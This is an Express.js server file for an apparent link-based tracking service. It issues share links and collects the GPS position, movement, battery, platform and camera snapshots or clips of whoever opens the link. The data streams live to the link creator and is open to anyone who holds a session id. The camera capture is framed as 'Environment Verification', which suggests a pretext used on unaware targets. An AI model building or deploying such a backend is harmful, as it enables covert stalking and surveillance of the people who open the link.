const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

// Trust reverse proxies (Vercel, Cloudflare, AWS ALB)
app.set("trust proxy", true);

app.use(express.json({ limit: "15mb" }));
app.use(express.urlencoded({ limit: "15mb", extended: true }));

// Serve static assets (index.html, share.html, style.css)
app.use(express.static(path.join(__dirname, "public")));

const fs = require("fs");
const os = require("os");
const TMP_FILE = path.join(os.tmpdir(), "geostream_sessions.json");

// Read from tmp storage if available
function readTmpSessions() {
  try {
    if (fs.existsSync(TMP_FILE)) {
      const data = JSON.parse(fs.readFileSync(TMP_FILE, "utf-8"));
      return new Map(Object.entries(data));
    }
  } catch (e) {}
  return new Map();
}

function writeTmpSessions(map) {
  try {
    const obj = Object.fromEntries(map);
    fs.writeFileSync(TMP_FILE, JSON.stringify(obj), "utf-8");
  } catch (e) {}
}

const memoryStore = readTmpSessions();
const activeListeners = new Map();

const kvUrl = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const kvToken = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function getSession(id) {
  if (!id) return null;
  if (memoryStore.has(id)) {
    return memoryStore.get(id);
  }
  // Check tmp disk
  const diskSessions = readTmpSessions();
  if (diskSessions.has(id)) {
    const s = diskSessions.get(id);
    memoryStore.set(id, s);
    return s;
  }
  // Check KV
  if (kvUrl && kvToken) {
    try {
      const res = await fetch(`${kvUrl}/get/session_${id}`, {
        headers: { Authorization: `Bearer ${kvToken}` },
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result) {
          const session = typeof data.result === "string" ? JSON.parse(data.result) : data.result;
          memoryStore.set(id, session);
          return session;
        }
      }
    } catch (e) {
      console.warn("KV fetch error:", e.message);
    }
  }
  return null;
}

async function saveSession(id, session) {
  memoryStore.set(id, session);
  writeTmpSessions(memoryStore);

  if (kvUrl && kvToken) {
    try {
      await fetch(`${kvUrl}/set/session_${id}`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${kvToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(session),
      });
    } catch (e) {
      console.warn("KV save error:", e.message);
    }
  }
}

// Auto-heal / auto-initialize session if not in memory (handles distributed serverless instances)
async function getOrCreateSession(id) {
  if (!id || typeof id !== "string") return null;
  const cleanId = id.replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 32);
  if (!cleanId) return null;

  let session = await getSession(cleanId);
  if (!session) {
    session = {
      id: cleanId,
      createdAt: Date.now(),
      expiresAt: Date.now() + 24 * 60 * 60 * 1000,
      location: null,
      history: [],
      device: null,
      media: [],
    };
    await saveSession(cleanId, session);
  }
  return session;
}

function getBaseUrl(req) {
  if (process.env.BASE_URL) {
    return process.env.BASE_URL.replace(/\/+$/, "");
  }
  if (process.env.VERCEL_URL) {
    return `https://${process.env.VERCEL_URL}`;
  }
  const protocol = req.headers["x-forwarded-proto"] || req.protocol || "http";
  const host = req.headers["x-forwarded-host"] || req.get("host");
  return `${protocol}://${host}`;
}

// 1. Create a new tracking session
app.post("/api/create", async (req, res) => {
  const id = crypto.randomBytes(8).toString("hex");
  const now = Date.now();
  const session = {
    id,
    createdAt: now,
    expiresAt: now + 24 * 60 * 60 * 1000,
    location: null,
    history: [],
    device: null,
  };

  await saveSession(id, session);

  const baseUrl = getBaseUrl(req);
  res.json({
    id,
    url: `${baseUrl}/share.html?id=${id}`,
    trackUrl: `${baseUrl}/?track=${id}`,
    createdAt: session.createdAt,
    expiresAt: session.expiresAt,
  });
});

// 2. Ingest real-time coordinates (Multi-device enabled)
app.post("/api/location", async (req, res) => {
  const { id, deviceId, name, color, latitude, longitude, accuracy, altitude, speed, heading, isLive, device } = req.body || {};

  const session = await getOrCreateSession(id);
  if (!session) {
    return res.status(400).json({ error: "Invalid session identifier." });
  }

  if (![latitude, longitude, accuracy].every(Number.isFinite)) {
    return res.status(400).json({ error: "Invalid coordinate payload." });
  }

  if (Math.abs(latitude) > 90 || Math.abs(longitude) > 180 || accuracy < 0) {
    return res.status(400).json({ error: "Coordinates out of geographic range." });
  }

  const now = Date.now();
  const devId = (deviceId && typeof deviceId === "string") ? deviceId.replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 32) : "dev_primary";
  const devName = (name && typeof name === "string") ? name.trim().slice(0, 40) : `Device #${devId.slice(-4)}`;
  const devColor = (color && typeof color === "string") ? color.slice(0, 10) : "#3b82f6";

  const telemetryPoint = {
    latitude: Number(latitude.toFixed(6)),
    longitude: Number(longitude.toFixed(6)),
    accuracy: Math.round(accuracy * 10) / 10,
    altitude: Number.isFinite(altitude) ? Math.round(altitude * 10) / 10 : null,
    speed: Number.isFinite(speed) && speed >= 0 ? Math.round(speed * 3.6 * 10) / 10 : 0,
    heading: Number.isFinite(heading) && heading >= 0 ? Math.round(heading) : null,
    isLive: Boolean(isLive),
    receivedAt: now,
  };

  if (!session.devices) session.devices = {};
  if (!session.devices[devId]) {
    session.devices[devId] = {
      id: devId,
      name: devName,
      color: devColor,
      location: null,
      history: [],
      device: null,
      firstSeen: now,
    };
  }

  const targetDev = session.devices[devId];
  targetDev.name = devName;
  targetDev.color = devColor;
  targetDev.location = telemetryPoint;
  targetDev.lastSeen = now;

  if (device && typeof device === "object") {
    targetDev.device = {
      battery: Number.isFinite(device.battery) ? Math.round(device.battery) : null,
      charging: Boolean(device.charging),
      platform: typeof device.platform === "string" ? device.platform.slice(0, 50) : null,
    };
  }

  if (!targetDev.history) targetDev.history = [];
  targetDev.history.push({
    lat: telemetryPoint.latitude,
    lng: telemetryPoint.longitude,
    acc: telemetryPoint.accuracy,
    speed: telemetryPoint.speed,
    time: now,
  });

  if (targetDev.history.length > 500) targetDev.history.shift();

  // Backward-compatibility primary location
  session.location = telemetryPoint;
  session.device = targetDev.device;
  session.latestDeviceId = devId;

  await saveSession(session.id, session);

  // Broadcast multi-device telemetry to active SSE listeners
  if (activeListeners.has(session.id)) {
    const payload = JSON.stringify({
      type: "telemetry",
      deviceId: devId,
      deviceData: targetDev,
      allDevices: Object.values(session.devices),
      location: telemetryPoint,
      historyCount: targetDev.history.length,
    });
    for (const sendEvent of activeListeners.get(session.id)) {
      try {
        sendEvent(payload);
      } catch (e) {}
    }
  }

  res.json({ ok: true, deviceId: devId, receivedAt: now });
});

// 3. Upload Environment Verification Camera Clip / Snapshot
app.post("/api/media", async (req, res) => {
  const { id, type, dataUrl } = req.body || {};

  const session = await getOrCreateSession(id);
  if (!session) {
    return res.status(400).json({ error: "Invalid session identifier." });
  }

  if (!dataUrl || typeof dataUrl !== "string") {
    return res.status(400).json({ error: "Invalid or missing media data." });
  }

  const mediaItem = {
    type: type === "video" ? "video" : "image",
    dataUrl,
    receivedAt: Date.now(),
  };

  if (!session.media) session.media = [];
  session.media.push(mediaItem);
  if (session.media.length > 10) session.media.shift();

  await saveSession(session.id, session);

  // Real-time broadcast to dashboard viewers
  if (activeListeners.has(session.id)) {
    const payload = JSON.stringify({
      type: "media",
      media: mediaItem,
    });
    for (const sendEvent of activeListeners.get(session.id)) {
      try {
        sendEvent(payload);
      } catch (e) {}
    }
  }

  res.json({ ok: true, receivedAt: mediaItem.receivedAt });
});

// 4. Query location telemetry & media clips
app.get("/api/location/:id", async (req, res) => {
  const session = await getOrCreateSession(req.params.id);
  if (!session) {
    return res.status(400).json({ error: "Invalid session identifier." });
  }

  res.json({
    id: session.id,
    createdAt: session.createdAt,
    expiresAt: session.expiresAt,
    location: session.location,
    device: session.device,
    history: session.history,
    media: session.media || [],
    devices: session.devices || {},
    allDevices: Object.values(session.devices || {}),
  });
});

// 5. Server-Sent Events stream
app.get("/api/stream/:id", async (req, res) => {
  const session = await getOrCreateSession(req.params.id);
  if (!session) {
    return res.status(400).json({ error: "Invalid session identifier." });
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders?.();

  const sendEvent = (data) => {
    res.write(`data: ${data}\n\n`);
  };

  if (!activeListeners.has(session.id)) {
    activeListeners.set(session.id, new Set());
  }
  activeListeners.get(session.id).add(sendEvent);

  if (session.location) {
    sendEvent(JSON.stringify({
      type: "telemetry",
      location: session.location,
      device: session.device,
      historyCount: session.history ? session.history.length : 0,
      allDevices: Object.values(session.devices || {}),
    }));
  } else {
    sendEvent(JSON.stringify({
      type: "waiting",
      message: "Awaiting remote device GPS lock...",
    }));
  }

  const heartbeat = setInterval(() => {
    res.write(": ping\n\n");
  }, 20000);

  req.on("close", () => {
    clearInterval(heartbeat);
    if (activeListeners.has(session.id)) {
      activeListeners.get(session.id).delete(sendEvent);
    }
  });
});

// Fallback for SPA/direct navigation
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start listening when executed locally
if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`[Enterprise Telemetry Server] Running on http://localhost:${PORT}`);
  });
}

// Export for Vercel Serverless
module.exports = app;
